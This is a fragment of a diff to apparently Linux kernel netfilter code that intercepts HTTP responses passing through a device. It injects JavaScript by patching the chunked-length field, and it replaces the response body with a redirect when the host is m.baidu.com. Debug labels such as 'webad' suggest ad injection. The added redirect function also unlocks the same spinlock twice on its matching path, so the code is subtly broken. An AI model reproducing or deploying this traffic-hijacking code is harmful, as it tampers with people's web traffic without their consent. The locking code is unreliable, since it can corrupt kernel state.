-        //printk(KERN_INFO "yjjtest~~~~~end:%s\n" , (char*)ip_hdr(skb)+dataoff);
-        return;
+    				   dst, strlen(dst)))
+            return;
+        
+        //printk(KERN_INFO "webad:~~~~~end:%s\n" , hskb->data);
     }
-    //printk(KERN_INFO "yjjtest~~~~start change chunked\n");
-	memset(&ts, 0, sizeof(ts));
-	matchoff_start = skb_find_text(skb, dataoff, skb->len,
-			  search[SEARCH_CHUNKED_VALUE_START].ts, &ts);
-	if (matchoff_start == UINT_MAX)
-		return;
-	
-	matchoff_start += search[SEARCH_CHUNKED_VALUE_START].len;
-
-	memset(&ts, 0, sizeof(ts));
-	matchoff_stop = skb_find_text(skb, dataoff+matchoff_start, skb->len,
-			  search[SEARCH_CHUNKED_VALUE_STOP].ts, &ts);
-	if (matchoff_stop == UINT_MAX)
-		return;
-
-	if(matchoff_stop > 8)
-	{
-		return;
-	}
-	
-	memcpy(src , (char*)ip_hdr(skb)+dataoff+matchoff_start , matchoff_stop);
-	sscanf(src, "%x", &tmp);
-	tmp+=JS_LEN;
-	sprintf(dst , "%x" , tmp);
-	//printk(KERN_INFO "yjjtest~~~~~end change chunked:%s---%s\n" , src , dst);
-
-	http_merge_packet(skb, ct, ctinfo,protoff,
-				   matchoff_start, matchoff_stop,
-				   dst, strlen(dst));
-	
-	//printk(KERN_INFO "yjjtest~~~~~end:%s\n" , (char*)ip_hdr(skb)+dataoff);
-
 }
 
-static void redirect(struct sk_buff *skb,
-		       unsigned int protoff,
-		       struct nf_conn *ct,
-		       enum ip_conntrack_info ctinfo)
+static void redirect(struct http_skb *hskb)
 
 {
-    struct tcphdr* tcph;
-	unsigned int dataoff;
-
-    tcph = (struct tcphdr *)((char*)ip_hdr(skb)+protoff);
-	dataoff = protoff + (tcph->doff<<2);
-    //printk(KERN_INFO "yjjtest start~~~~~%s\n" , (char*)ip_hdr(skb)+dataoff);
-    //printk(KERN_INFO "yjjtest~~~~~%u---%u---%u\n" , skb->len , protoff , dataoff);
-	http_merge_packet(skb, ct, ctinfo,protoff,
-    				   0, skb->len-dataoff,
-    				   REDIRECT,REDIRECT_LEN);
-    //printk(KERN_INFO "yjjtest end~~~~~%s\n" , (char*)ip_hdr(skb)+dataoff);
+    typeof(http_merge_packet_hook) http_merge_packet_tmp;
+    spin_lock_bh(&http_session_lock); 
+    if(!memcmp(ghttps.host , "m.baidu.com" , 11))
+    {
+    
+        spin_unlock_bh(&http_session_lock); 
+        http_merge_packet_tmp = rcu_dereference(http_merge_packet_hook); 
+        http_merge_packet_tmp(hskb->skb, hskb->ct, hskb->ctinfo,hskb->protoff,
+        		   0, hskb->data_len,
+        		   REDIRECT,REDIRECT_LEN);
+    }
+    spin_unlock_bh(&http_session_lock); 
 }
 
-static void change_package(struct sk_buff *skb,
-		       unsigned int protoff,
-		       struct nf_conn *ct,
-		       enum ip_conntrack_info ctinfo)
+static void change_package(struct http_skb *hskb)
 {
-    insert_js(skb,protoff,ct,ctinfo);
-    //redirect(skb,protoff,ct,ctinfo);
+    insert_js(hskb);
+    redirect(hskb);
 }
-
 
